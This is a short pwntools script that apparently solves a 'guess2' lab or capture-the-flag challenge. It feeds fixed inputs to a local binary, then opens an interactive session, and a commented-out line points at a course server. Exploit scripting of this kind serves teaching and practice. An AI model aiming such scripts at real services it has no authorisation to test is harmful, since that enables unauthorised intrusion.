from pwn import *

#conn = remote('aup.zoolab.org', 38157)
conn = process('../src/guess2')

conn.recvuntil(':').decode()
conn.sendline('123')

conn.recvuntil('?').decode()
conn.sendline('123456789')

conn.recvuntil(':').decode()
conn.sendline('123456789')

conn.interactive()

